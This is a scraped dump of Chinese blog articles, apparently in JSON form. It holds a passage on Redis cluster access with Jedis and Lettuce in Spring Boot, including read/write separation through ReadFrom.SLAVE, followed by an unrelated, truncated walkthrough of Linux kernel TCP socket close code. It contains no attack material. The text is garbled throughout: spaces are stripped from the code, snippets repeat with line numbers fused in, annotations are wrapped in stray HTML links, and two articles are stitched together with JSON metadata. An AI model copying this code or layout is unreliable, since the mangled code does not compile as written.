通项目使用JedisCluster的简单过程，若在springboot项目中，可以定义JedisConfig类，使用@Configuration、@Value、@Bean等一些列注解完成JedisCluster的配置，然后再注入该JedisCluster到相关service逻辑中引用，这里介绍略。使用Lettuce读写redis-cluster数据Lettuce和Jedis的定位都是Redis的client。Jedis在实现上是直接连接的redisserver，如果在多线程环境下是非线程安全的，这个时候只有使用连接池，为每个Jedis实例增加物理连接，每个线程都去拿自己的Jedis实例，当连接数量增多时，物理连接成本就较高了。Lettuce的连接是基于Netty的，连接实例（StatefulRedisConnection）可以在多个线程间并发访问，应为StatefulRedisConnection是线程安全的，所以一个连接实例（StatefulRedisConnection）就可以满足多线程环境下的并发访问，当然这个也是可伸缩的设计，一个连接实例不够的情况也可以按需增加连接实例。其中springboot2.X版本中，依赖的spring-session-data-redis已经默认替换成Lettuce了。同样，例如我们有6台机器组成的redis-cluster：172.20.52.85:7000、172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005其中master机器对应端口：7000、7004、7005slave对应端口：7001、7002、7003在springboot2.X版本中使用Lettuce操作redis-cluster数据的方法参考如下：（1）pom文件参考如下：parent中指出springboot的版本，要求2.X以上：&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;&lt;version&gt;2.0.4.RELEASE&lt;/version&gt;&lt;relativePath/&gt;&lt;!--lookupparentfromrepository--&gt;&lt;/parent&gt;&lt;!--lookupparentfromrepository--&gt;1234567&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;&lt;version&gt;2.0.4.RELEASE&lt;/version&gt;&lt;relativePath/&gt;&lt;!--lookupparentfromrepository--&gt;&lt;/parent&gt;&lt;!--lookupparentfromrepository--&gt;依赖中需要加入spring-boot-starter-data-redis，参考如下：&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;1234&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;（2）springboot的配置文件要包含如下内容：spring.redis.database=0spring.redis.lettuce.pool.max-idle=10spring.redis.lettuce.pool.max-wait=500spring.redis.cluster.timeout=1000spring.redis.cluster.max-redirects=3spring.redis.cluster.nodes=172.20.52.85:7000,172.20.52.85:7001,172.20.52.85:7002,172.20.52.85:7003,172.20.52.85:7004,172.20.52.85:70051234567spring.redis.database=0spring.redis.lettuce.pool.max-idle=10spring.redis.lettuce.pool.max-wait=500spring.redis.cluster.timeout=1000spring.redis.cluster.max-redirects=3spring.redis.cluster.nodes=172.20.52.85:7000,172.20.52.85:7001,172.20.52.85:7002,172.20.52.85:7003,172.20.52.85:7004,172.20.52.85:7005（3）新建RedisConfiguration类，参考代码如下：@ConfigurationpublicclassRedisConfiguration{[@Resource](https://my.oschina.net/u/929718)privateLettuceConnectionFactorymyLettuceConnectionFactory;&lt;ahref='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;publicRedisTemplate&lt;String,Serializable&gt;redisTemplate(){RedisTemplate&lt;String,Serializable&gt;template=newRedisTemplate&lt;&gt;();template.setKeySerializer(newStringRedisSerializer());//template.setValueSerializer(newGenericJackson2JsonRedisSerializer());template.setValueSerializer(newStringRedisSerializer());template.setConnectionFactory(myLettuceConnectionFactory);returntemplate;}}12345678910111213141516171819202122@ConfigurationpublicclassRedisConfiguration{[@Resource](https://my.oschina.net/u/929718)privateLettuceConnectionFactorymyLettuceConnectionFactory;&lt;ahref='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;publicRedisTemplate&lt;String,Serializable&gt;redisTemplate(){RedisTemplate&lt;String,Serializable&gt;template=newRedisTemplate&lt;&gt;();template.setKeySerializer(newStringRedisSerializer());//template.setValueSerializer(newGenericJackson2JsonRedisSerializer());template.setValueSerializer(newStringRedisSerializer());template.setConnectionFactory(myLettuceConnectionFactory);returntemplate;}}（4）新建RedisFactoryConfig类，参考代码如下：@ConfigurationpublicclassRedisFactoryConfig{@AutowiredprivateEnvironmentenvironment;&lt;ahref='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;publicRedisConnectionFactorymyLettuceConnectionFactory(){Map&lt;String,Object&gt;source=newHashMap&lt;String,Object&gt;();source.put(\"spring.redis.cluster.nodes\",environment.getProperty(\"spring.redis.cluster.nodes\"));source.put(\"spring.redis.cluster.timeout\",environment.getProperty(\"spring.redis.cluster.timeout\"));source.put(\"spring.redis.cluster.max-redirects\",environment.getProperty(\"spring.redis.cluster.max-redirects\"));RedisClusterConfigurationredisClusterConfiguration;redisClusterConfiguration=newRedisClusterConfiguration(newMapPropertySource(\"RedisClusterConfiguration\",source));returnnewLettuceConnectionFactory(redisClusterConfiguration);}}1234567891011121314151617181920212223@ConfigurationpublicclassRedisFactoryConfig{@AutowiredprivateEnvironmentenvironment;&lt;ahref='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;publicRedisConnectionFactorymyLettuceConnectionFactory(){Map&lt;String,Object&gt;source=newHashMap&lt;String,Object&gt;();source.put(\"spring.redis.cluster.nodes\",environment.getProperty(\"spring.redis.cluster.nodes\"));source.put(\"spring.redis.cluster.timeout\",environment.getProperty(\"spring.redis.cluster.timeout\"));source.put(\"spring.redis.cluster.max-redirects\",environment.getProperty(\"spring.redis.cluster.max-redirects\"));RedisClusterConfigurationredisClusterConfiguration;redisClusterConfiguration=newRedisClusterConfiguration(newMapPropertySource(\"RedisClusterConfiguration\",source));returnnewLettuceConnectionFactory(redisClusterConfiguration);}}（5）在业务类service中注入Lettuce相关的RedisTemplate，进行相关操作。以下是我化简到了springbootstarter中进行，参考代码如下：@SpringBootApplicationpublicclassNewRedisClientApplication{publicstaticvoidmain(String[]args){ApplicationContextcontext=SpringApplication.run(NewRedisClientApplication.class,args);RedisTemplateredisTemplate=(RedisTemplate)context.getBean(\"redisTemplate\");StringrtnValue=(String)redisTemplate.opsForValue().get(\"event:10\");System.out.println(rtnValue);}}1234567891011@SpringBootApplicationpublicclassNewRedisClientApplication{publicstaticvoidmain(String[]args){ApplicationContextcontext=SpringApplication.run(NewRedisClientApplication.class,args);RedisTemplateredisTemplate=(RedisTemplate)context.getBean(\"redisTemplate\");StringrtnValue=(String)redisTemplate.opsForValue().get(\"event:10\");System.out.println(rtnValue);}}运行结果的截图如下：以上的介绍，是采用Jedis以及Lettuce对redis-cluster数据的简单读取。Jedis也好，Lettuce也好，其对于redis-cluster架构下的数据的读取，都是默认是按照redis官方对redis-cluster的设计，自动进行重定向到master节点中进行的，哪怕是我们在配置中列出了所有的master节点和slave节点。查阅了Jedis以及Lettuce的github上的源码，默认不支持redis-cluster下的读写分离，可以看出Jedis若要支持redis-cluster架构下的读写分离，需要自己改写和构建多一些包装类，定义好Master和slave节点的逻辑；而Lettuce的源码中，实际上预留了方法（setReadForm(ReadFrom.SLAVE)）进行redis-cluster架构下的读写分离，相对来说修改会简单一些，具体可以参考后面的章节。redis-cluster架构下的读写能力的优化方案在上面的一些章节中，已经有讲到redis近年来的高可用架构的演变，以及在redis-cluster架构下，官方对redis-master、redis-slave的其实有使用上的建议，即redis-master节点一般用于接收读写，而redis-slave节点则一般只用于备份，其与对应的master拥有相同的slot集合，若某个redis-master意外失效，则再将其对应的slave进行升级为临时redis-master。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离。具体可以参阅redis官方文档（https://redis.io/commands/readonly），以下是reids在线文档中，对slave的readonly说明内容：实际上本身master就是可以任意扩展的，所以如果要支撑更大的读吞吐量，或者写吞吐量，或者数据量，都可以直接对master进行横向水平扩展就可以了。也就是说，扩容master，跟之前扩容slave并进行读写分离，效果是一样的或者说更好。所以下面我们将按照redis-cluster架构下分别进行水平扩展Master，以及在redis-cluster架构下对master、slave进行读写分离两套方案进行讲解。（一）水平扩展Master实例来进行redis-cluster性能的提升redis官方在线文档以及一些互联网的参考资料都表明，在redis-cluster架构下，实际上不建议做物理的读写分离。那么如果我们真的不做读写分离的话，能否通过简单的方法进行redis-cluster下的性能的提升？我们可以通过master的水平扩展，来横向扩展读写吞吐量，并且能支撑更多的海量数据。对master进行水平扩展有两种方法，一种是单机上面进行master实例的增加（建议每新增一个master，也新增一个对应的slave），另一种是新增机器部署新的master实例（同样建议每新增一个master，也新增一个对应的slave）。当然，我们也可以进行这两种方法的有效结合。（1）单机上通过多线程建立新redis-master实例，即逻辑上的水平扩展：一般的，对于redis单机，单线程的读吞吐是4w/s~5W/s，写吞吐为2w/s。单机合理开启redis多线程情况下（一般线程数为CPU核数的倍数），总吞吐量会有所上升，但每个线程的平均处理能力会有所下降。例如一个2核CPU，开启2线程的时候，总读吞吐能上升是6W/s~7W/s，即每个线程平均约3W/s再多一些。但过多的redis线程反而会限制了总吞吐量。（2）扩展更多的机器，部署新redis-master实例，即物理上的水平扩展：例如，我们可以再原来只有3台master的基础上，连入新机器继续新实例的部署，最终水平扩展为6台master（建议每新增一个master，也新增一个对应的slave）。例如之前每台master的处理能力假设是读吞吐5W/s,写吞吐2W/s,扩展前一共的处理能力是：15W/s读，6W/s写。如果我们水平扩展到6台master，读吞吐可以达到总量30W/s，写可以达到12w/s，性能能够成倍增加。（3）若原本每台部署redis-master实例的机器都性能良好，则可以通过上述两者的结合，进行一个更优的组合。使用该方案进行redis-cluster性能的提升的优点有：（1）符合redis官方要求和数据的准确性。（2）真正达到更大吞吐量的性能扩展。（3）无需代码的大量更改，只需在配置文件中重新配置新的节点信息。当然缺点也是有的：（1）需要新增机器，提升性能，即成本会增加。（2）若不新增机器，则需要原来的实例所运行的机器性能较好，能进行以多线程的方式部署新实例。但随着线程的增多，而机器的能力不足以支撑的时候，实际上总体能力会提升不太明显。（3）redis-cluster进行新的水平扩容后，需要对master进行新的hashslot重新分配，这相当于需要重新加载所有的key，并按算法平均分配到各个Master的slot当中。（二）引入Lettuce以及修改相关方法，达到对redis-cluster的读写分离通过上面的一些章节，我们已经可以了解到Lettuce客户端读取redis的一些操作，使用Lettuce能体现出了简单，安全，高效。实际上，查阅了Lettuce对redis的读写，许多地方都进行了redis的读写分离。但这些都是基于上述redis架构中最普通的主从分离架构下的读写分离，而对于redis-cluster架构下，Lettuce可能是遵循了redis官方的意见，在该架构下，Lettuce在源码中直接设置了只由master上进行读写（具体参见gitHub的Lettuce项目）：那么如果真的需要让Lettuce改为能够读取redis-cluster的slave，进行读写分离，是否可行？实际上还是可以的。这就需要我们自己在项目中进行二次加工，即不使用spring-boot中的默认Lettuce初始化方法，而是自己去写一个属于自己的Lettuce的新RedisClusterClient的连接，并且对该RedisClusterClient的连接进行一个比较重要的设置，那就是由connection.setReadFrom(ReadFrom.MASTER)改为connection.setReadFrom(ReadFrom.SLAVE)。下面我们开始对之前章节中的Lettuce读取redis-cluster数据的例子，进行改写，让Lettuce能够支持该架构下的读写分离：springboot2.X版本中，依赖的spring-session-data-redis已经默认替换成Lettuce了。同样，例如我们有6台机器组成的redis-cluster：172.20.52.85:7000、172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005其中master机器对应端口：7000、7004、7005slave对应端口：7001、7002、7003在springboot2.X版本中使用Lettuce操作redis-cluster数据的方法参考如下：（1）pom文件参考如下：parent中指出springboot的版本，要求2.X以上：&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;&lt;version&gt;2.0.4.RELEASE&lt;/version&gt;&lt;relativePath/&gt;&lt;!--lookupparentfromrepository--&gt;&lt;/parent&gt;&lt;!--lookupparentfromrepository--&gt;1234567&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;&lt;version&gt;2.0.4.RELEASE&lt;/version&gt;&lt;relativePath/&gt;&lt;!--lookupparentfromrepository--&gt;&lt;/parent&gt;&lt;!--lookupparentfromrepository--&gt;依赖中需要加入spring-boot-starter-data-redis，参考如下：&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;1234&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;（2）springboot的配置文件要包含如下内容：spring.redis.database=0spring.redis.lettuce.pool.max-idle=10spring.redis.lettuce.pool.max-wait=500spring.redis.cluster.timeout=1000spring.redis.cluster.max-redirects=3spring.redis.cluster.nodes=172.20.52.85:7000,172.20.52.85:7001,172.20.52.85:7002,172.20.52.85:7003,172.20.52.85:7004,172.20.52.85:70051234567spring.redis.database=0spring.redis.lettuce.pool.max-idle=10spring.redis.lettuce.pool.max-wait=500spring.redis.cluster.timeout=1000spring.redis.cluster.max-redirects=3spring.redis.cluster.nodes=172.20.52.85:7000,172.20.52.85:7001,172.20.52.85:7002,172.20.52.85:7003,172.20.52.85:7004,172.20.52.85:7005（3）我们回到RedisConfiguration类中，删除或屏蔽之前的RedisTemplate方法，新增自定义的redisClusterConnection方法，并且设置好读写分离，参考代码如下：@ConfigurationpublicclassRedisConfiguration{@AutowiredprivateEnvironmentenvironment;&lt;ahref='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;publicStatefulRedisClusterConnectionredisClusterConnection(){StringstrRedisClusterNodes=environment.getProperty(\"spring.redis.cluster.nodes\");String[]listNodesInfos=strRedisClusterNodes.split(\",\");List&lt;RedisURI&gt;listRedisURIs=newArrayList&lt;RedisURI&gt;();for(StringtmpNodeInfo:listNodesInfos){String[]tmpInfo=tmpNodeInfo.split(\":\");listRedisURIs.add(newRedisURI(tmpInfo[0],Integer.parseInt(tmpInfo[1]),Duration.ofDays(10)));}RedisClusterClientclusterClient=RedisClusterClient.create(listRedisURIs);StatefulRedisClusterConnection&lt;String,String&gt;connection=clusterClient.connect();connection.setReadFrom(ReadFrom.SLAVE);returnconnection;}}1234567891011121314151617181920212223242526@ConfigurationpublicclassRedisConfiguration{@AutowiredprivateEnvironmentenvironment;&lt;ahref='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;publicStatefulRedisClusterConnectionredisClusterConnection(){StringstrRedisClusterNodes=environment.getProperty(\"spring.redis.cluster.nodes\");String[]listNodesInfos=strRedisClusterNodes.split(\",\");List&lt;RedisURI&gt;listRedisURIs=newArrayList&lt;RedisURI&gt;();for(StringtmpNodeInfo:listNodesInfos){String[]tmpInfo=tmpNodeInfo.split(\":\");listRedisURIs.add(newRedisURI(tmpInfo[0],Integer.parseInt(tmpInfo[1]),Duration.ofDays(10)));}RedisClusterClientclusterClient=RedisClusterClient.create(listRedisURIs);StatefulRedisClusterConnection&lt;String,String&gt;connection=clusterClient.connect();connection.setReadFrom(ReadFrom.SLAVE);returnconnection;}}其中，这三行代码是能进行redis-cluster架构下读写分离的核心：RedisClusterClientclusterClient=RedisClusterClient.create(listRedisURIs);StatefulRedisClusterConnection&lt;String,String&gt;connection=clusterClient.connect();connection.setReadFrom(ReadFrom.SLAVE);123RedisClusterClientclusterClient=RedisClusterClient.create(listRedisURIs);StatefulRedisClusterConnection&lt;String,String&gt;connection=clusterClient.connect();connection.setReadFrom(ReadFrom.SLAVE);在业务类service中注入Lettuce相关的redisClusterConnection，进行相关读写操作。以下是我直接化简到了springbootstarter中进行，参考代码如下：@SpringBootApplicationpublicclassNewRedisClientApplication{publicstaticvoidmain(String[]args){ApplicationContextcontext=SpringApplication.run(NewRedisClientApplication.class,args);StatefulRedisClusterConnection&lt;String,String&gt;redisClusterConnection=(StatefulRedisClusterConnection)context.getBean(\"redisClusterConnection\");System.out.println(redisClusterConnection.sync().get(\"event:10\"));}}123456789101112@SpringBootApplicationpublicclassNewRedisClientApplication{publicstaticvoidmain(String[]args){ApplicationContextcontext=SpringApplication.run(NewRedisClientApplication.class,args);StatefulRedisClusterConnection&lt;String,String&gt;redisClusterConnection=(StatefulRedisClusterConnection)context.getBean(\"redisClusterConnection\");System.out.println(redisClusterConnection.sync().get(\"event:10\"));}}运行的结果如下图所示：可以看到，经过改写的redisClusterConnection的确能读取到redis-cluster的数据。但这一个数据我们还需要验证一下到底是不是通过slave读取到的，又或者还是通过slave重定向给master才获取到的？带着疑问，我们可以开通debug模式，在redisClusterConnection.sync().get(“event:10”)等类似的获取数据的代码行上面打上断点。通过代码的走查，我们可以看到，在ReadFromImpl类中，最终会select到key所在的slave节点，进行返回，并在该slave中进行数据的读取：ReadFromImpl显示：另外我们通过connectFuture中的显示也验证了对于slave的readonly生效了：这样，就达到了通过Lettuce客户端对redis-cluster的读写分离了。使用该方案进行redis-cluster性能的提升的优点有：（1）直接通过代码级更改，而不需要配置新的redis-cluster环境。（2）无需增加机器或升级硬件设备。但同时，该方案也有缺点：（1）非官方对redis-cluster的推荐方案，因为在redis-cluster架构下，进行读写分离，有可能会读到过期的数据。（2）需对项目进行全面的替换，将Jedis客户端变为Lettuce客户端，对代码的改动较大，而且使用Lettuce时，使用的并非springboot的自带集成Lettuce的redisTemplate配置方法，而是自己配置读写分离的redisClusterConnetcion，日后遇到问题的时候，可能官方文档的支持率或支撑能力会比较低。（3）需修改redis-cluster的master、slave配置，在各个节点中都需要加入slave-read-onlyyes。（4）性能的提升没有水平扩展master主机和实例来得直接干脆。总结总体上来说，redis-cluster高可用架构方案是目前最好的redis架构方案，redis的官方对redis-cluster架构是建议redis-master用于接收读写，而redis-slave则用于备份（备用），默认不建议读写分离。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离。Jedis、Lettuce都可以进行redis-cluster的读写操作，而且默认只针对Master进行读写，若要对redis-cluster架构下进行读写分离，则Jedis需要进行源码的较大改动，而Lettuce开放了setReadFrom()方法，可以进行二次封装成读写分离的客户端，相对简单，而且Lettuce比Jedis更安全。redis-cluster架构下可以直接通过水平扩展master来达到性能的提升。参考文档1，网文《关于redis主从、哨兵、集群的介绍》：https://blog.csdn.net/c295477887/article/details/524876212，知乎《lettuce与jedis对比介绍》：https://www.zhihu.com/question/531246853，网文《Redis高可用架构最佳实践问答集锦》：http://www.talkwithtrend.com/Article/1781654，网文《Redis进阶实践之十一Redis的Cluster集群搭建》：https://www.cnblogs.com/PatrickLiu/p/8458788.html5，redis官方在线文档：https://redis.io/6，网文《rediscluster的介绍及搭建(6)》：https://blog.csdn.net/qq1137623160/article/details/791846867，网文《Springboot2.X集成redis集群(Lettuce)连接》：http://www.cnblogs.com/xymBlog/p/9303032.html8，Jedis的gitHub地址：https://github.com/xetorthio/jedis9，Lettuce的gitHub地址：https://github.com/lettuce-io/lettuce-core/2赞2收藏评论", "url_object_id": "ff71528650cafbc9d1a04fda19074c0c"},{"title": "从 Linux 源码看 socket 的 close", "url": "http://blog.jobbole.com/114276/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 1, "tags": "2,0,1,8,/,0,8,/,1,6, ,·", "content": "原文出处：无毁的湖光-Al从linux源码看socket的close笔者一直觉得如果能知道从应用到框架再到操作系统的每一处代码，是一件Exciting的事情。上篇博客讲了socket的阻塞和非阻塞，这篇就开始谈一谈socket的close(以tcp为例且基于linux-2.6.24内核版本)TCP关闭状态转移图:众所周知，TCP的close过程是四次挥手，状态机的变迁也逃不出TCP状态转移图，如下图所示:tcp的关闭主要分主动关闭、被动关闭以及同时关闭(特殊情况,不做描述)主动关闭close(fd)的过程以C语言为例，在我们关闭socket的时候，会使用close(fd)函数:intsocket_fd;socket_fd=socket(AF_INET,SOCK_STREAM,0);...//此处通过文件描述符关闭对应的socketclose(socket_fd)123456intsocket_fd;socket_fd=socket(AF_INET,SOCK_STREAM,0);...//此处通过文件描述符关闭对应的socketclose(socket_fd)而close(intfd)又是通过系统调用sys_close来执行的:asmlinkagelongsys_close(unsignedintfd){//清除(close_on_exec即退出进程时）的位图标记FD_CLR(fd,fdt-&gt;close_on_exec);//释放文件描述符//将fdt-&gt;open_fds即打开的fd位图中对应的位清除//再将fd挂入下一个可使用的fd以便复用__put_unused_fd(files,fd);//调用file_pointer的close方法真正清除retval=filp_close(filp,files);}12345678910111213asmlinkagelongsys_close(unsignedintfd){//清除(close_on_exec即退出进程时）的位图标记FD_CLR(fd,fdt-&gt;close_on_exec);//释放文件描述符//将fdt-&gt;open_fds即打开的fd位图中对应的位清除//再将fd挂入下一个可使用的fd以便复用__put_unused_fd(files,fd);//调用file_pointer的close方法真正清除retval=filp_close(filp,files);}我们看到最终是调用的filp_close方法:intfilp_close(structfile*filp,fl_owner_tid){//如果存在flush方法则flushif(filp-&gt;f_op&amp;&amp;filp-&gt;f_op-&gt;flush)filp-&gt;f_op-&gt;flush(filp,id);//调用fputfput(filp);......}12345678910intfilp_close(structfile*filp,fl_owner_tid){//如果存在flush方法则flushif(filp-&gt;f_op&amp;&amp;filp-&gt;f_op-&gt;flush)filp-&gt;f_op-&gt;flush(filp,id);//调用fputfput(filp);......}紧接着我们进入fput:voidfastcallfput(structfile*file){//对应file-&gt;count--,同时检查是否还有关于此file的引用//如果没有，则调用_fput进行释放if(atomic_dec_and_test(&amp;file-&gt;f_count))__fput(file);}12345678voidfastcallfput(structfile*file){//对应file-&gt;count--,同时检查是否还有关于此file的引用//如果没有，则调用_fput进行释放if(atomic_dec_and_test(&amp;file-&gt;f_count))__fput(file);}同一个file(socket)有多个引用的情况很常见，例如下面的例子:所以在多进程的socket服务器编写过程中，父进程也需要close(fd)一次，以免socket无法最终关闭然后就是_fput函数了:voidfastcall__fput(structfile*file){//从eventpoll中释放fileeventpoll_release(file);//如果是release方法，则调用releaseif(file-&gt;f_op&amp;&amp;file-&gt;f_op-&gt;release)file-&gt;f_op-&gt;release(inode,file);}123456789voidfastcall__fput(structfile*file){//从eventpoll中释放fileeventpoll_release(file);//如果是release方法，则调用releaseif(file-&gt;f_op&amp;&amp;file-&gt;f_op-&gt;release)file-&gt;f_op-&gt;release(inode,file);}由于我们讨论的是socket的close,所以，我们现在探查下file-&gt;f_op-&gt;release在socket情况下的实现:f_op-&gt;release的赋值我们跟踪创建socket的代码，即socket(AF_INET,SOCK_STREAM,0);|-sock_create//创建sock|-sock_map_fd//将sock和fd关联|-sock_attach_fd|-init_file(file,...,&amp;socket_file_ops);|-file-&gt;f_op=fop;//fop赋值为socket_file_ops1234567socket(AF_INET,SOCK_STREAM,0);|-sock_create//创建sock|-sock_map_fd//将sock和fd关联|-sock_attach_fd|-init_file(file,...,&amp;socket_file_ops);|-file-&gt;f_op=fop;//fop赋值为socket_file_opssocket_file_ops的实现为:staticconststructfile_operationssocket_file_ops={.owner=THIS_MODULE,......//我们在这里只考虑sock_close.release=sock_close,......};12345678staticconststructfile_operationssocket_file_ops={.owner=THIS_MODULE,......//我们在这里只考虑sock_close.release=sock_close,......};继续跟踪:sock_close|-sock_release|-sock-&gt;ops-&gt;release(sock);1234sock_close|-sock_release|-sock-&gt;ops-&gt;release(sock);在上一篇博客中，我们知道sock-&gt;ops为下图所示:即(在这里我们仅考虑tcp,即sk_prot=tcp_prot):inet_stream_ops-&gt;release|-inet_release|-sk-&gt;sk_prot-&gt;close(sk,timeout);|-tcp_prot-&gt;close(sk,timeout);|-&gt;tcp_prot.tcp_close123456inet_stream_ops-&gt;release|-inet_release|-sk-&gt;sk_prot-&gt;close(sk,timeout);|-tcp_prot-&gt;close(sk,timeout);|-&gt;tcp_prot.tcp_close关于fd与socket的关系如下图所示:上图中红色线标注的是close(fd)的调用链tcp_closevoidtcp_close(structsock*sk,longtimeout){if(sk-&gt;sk_state==TCP_LISTEN){//如果是listen状态，则直接设为close状态tcp_set_state(sk,TCP_CLOSE);}//清空掉recv.buffer......//SOCK_LINGER选项的处理......elseif(tcp_close_state(sk)){//tcp_close_state会将sk从established状态变为fin_wait1//发送fin包tcp_send_fin(sk);}......}12345678910111213141516171819voidtcp_close(structsock*sk,longtimeout){if(sk-&gt;sk_state==TCP_LISTEN){//如果是listen状态，则直接设为close状态tcp_set_state(sk,TCP_CLOSE);}//清空掉recv.buffer......//SOCK_LINGER选项的处理......elseif(tcp_close_state(sk)){//tcp_close_state会将sk从established状态变为fin_wait1//发送fin包tcp_send_fin(sk);}......}四次挥手现在就是我们的四次挥手环节了，其中上半段的两次挥手下图所示:首先，在tcp_close_state(sk)中已经将状态设置为fin_wait1,并调用tcp_send_finvoidtcp_send_fin(structsock*sk){......//这边设置flags为ack和finTCP_SKB_CB(skb)-&gt;flags=(TCPCB_FLAG_ACK|TCPCB_FLAG_FIN);......//发送fin包，同时关闭nagle__tcp_push_pending_frames(sk,mss_now,TCP_NAGLE_OFF);}12345678910voidtcp_send_fin(structsock*sk){......//这边设置flags为ack和finTCP_SKB_CB(skb)-&gt;flags=(TCPCB_FLAG_ACK|TCPCB_FLAG_FIN);......//发送fin包，同时关闭nagle__tcp_push_pending_frames(sk,mss_now,TCP_NAGLE_OFF);}如上图Step1所示。接着，主动关闭的这一端等待对端的ACK，如果ACK回来了，就设置TCP状态为FIN_WAIT2,如上图Step2所示,具体代码如下:tcp_v4_do_rcv|-tcp_rcv_state_processinttcp_rcv_state_process(structsock*sk,structsk_buff*skb,structtcphdr*th,unsignedlen){....../*step5:checktheACKfield*/if(th-&gt;ack){...caseTCP_FIN_WAIT1://这处判断是确认此ack是发送Fin包对应的那个ackif(tp-&gt;snd_una==tp-&gt;write_seq){//设置为FIN_WAIT2状态tcp_set_state(sk,TCP_FIN_WAIT2);......//设定TCP_FIN_WAIT2定时器，将在tmo时间到期后将状态变迁为TIME_WAIT//不过是这时候改的已经是inet_timewait_sock了tcp_time_wait(sk,TCP_FIN_WAIT2,tmo);......}}/*step7:processthesegmenttext*/switch(sk-&gt;sk_state){caseTCP_FIN_WAIT1:caseTCP_FIN_WAIT2:......caseTCP_ESTABLISHED:tcp_data_queue(sk,skb);queued=1;break;}.....}123456789101112131415161718192021222324252627282930313233tcp_v4_do_rcv|-tcp_rcv_state_processinttcp_rcv_state_process(structsock*sk,structsk_buff*skb,structtcphdr*th,unsignedlen){....../*step5:checktheACKfield*/if(th-&gt;ack){...caseTCP_FIN_WAIT1://这处判断是确认此ack是发送Fin包对应的那个ackif(tp-&gt;snd_una==tp-&gt;write_seq){//设置为FIN_WAIT2状态tcp_set_state(sk,TCP_FIN_WAIT2);......//设定TCP_FIN_WAIT2定时器，将在tmo时间到期后将状态变迁为TIME_WAIT//不过是这时候改的已经是inet_timewait_sock了tcp_time_wait(sk,TCP_FIN_WAIT2,tmo);......}}/*step7:processthesegmenttext*/switch(sk-&gt;sk_state){caseTCP_FIN_WAIT1:caseTCP_FIN_WAIT2:......caseTCP_ESTABLISHED:tcp_data_queue(sk,skb);queued=1;break;}.....}值的注意的是，从TCP_FIN_WAIT1变迁到TCP_FIN_WAIT2之后，还调用tcp_time_wait设置一个TCP_FIN_WAIT2定时器，在tmo+(2MSL或者基于RTO计算超时)超时后会直接变迁到closed状态(不过此时已经是inet_timewait_sock了）。这个超时时间可以配置,如果是ipv4的话,则可以按照下列配置:net.ipv4.tcp_fin_timeout/sbin/sysctl-wnet.ipv4.tcp_fin_timeout=30123net.ipv4.tcp_fin_timeout/sbin/sysctl-wnet.ipv4.tcp_fin_timeout=30如下图所示:有这样一步的原因是防止对端由于种种原因始终没有发送fin,防止一直处于FIN_WAIT2状态。接着在FIN_WAIT2状态等待对端的FIN，完成后面两次挥手:由Step1和Step2将状态置为了FIN_WAIT_2，然后接收到对端发送的FIN之后,将会将状态设置为time_wait,如下代码所示:tcp_v4_do_rcv|-tcp_rcv_state_process|-tcp_data_queue|-tcp_finstaticvoidtcp_fin(structsk_buff*skb,structsock*sk,structtcphdr*th){switch(sk-&gt;sk_state){......caseTCP_FIN_WAIT1://这边是处理同时关闭的情况tcp_send_ack(sk);tcp_set_state(sk,TCP_CLOSING);break;caseTCP_FIN_WAIT2:/*ReceivedaFIN--sendACKandenterTIME_WAIT.*///收到FIN之后，发送ACK同时将状态进入TIME_WAITtcp_send_ack(sk);tcp_time_wait(sk,TCP_TIME_WAIT,0);}}123456789101112131415161718192021tcp_v4_do_rcv|-tcp_rcv_state_process|-tcp_data_queue|-tcp_finstaticvoidtcp_fin(structsk_buff*skb,structsock*sk,structtcphdr*th){switch(sk-&gt;sk_state){......caseTCP_FIN_WAIT1://这边是处理同时关闭的情况tcp_send_ack(sk);tcp_set_state(sk,TCP_CLOSING);break;caseTCP_FIN_WAIT2:/*ReceivedaFIN--sendACKandenterTIME_WAIT.*///收到FIN之后，发送ACK同时将状态进入TIME_WAITtcp_send_ack(sk);tcp_time_wait(sk,TCP_TIME_WAIT,0);}}time_wait状态时，原socket会被destroy,然后新创建一个inet_timewait_sock,这样就能及时的将原socket使用的资源回收。而inet_timewait_sock被挂入一个bucket中，由inet_twdr_twcal_tick定时从bucket中将超过(2MSL或者基于RTO计算的时间)的time_wait的实例删除。我们来看下tcp_time_wait函数voidtcp_time_wait(structsock*sk,intstate,inttimeo){//建立inet_timewait_socktw=inet_twsk_alloc(sk,state);//放到bucket的具体位置等待定时器删除inet_t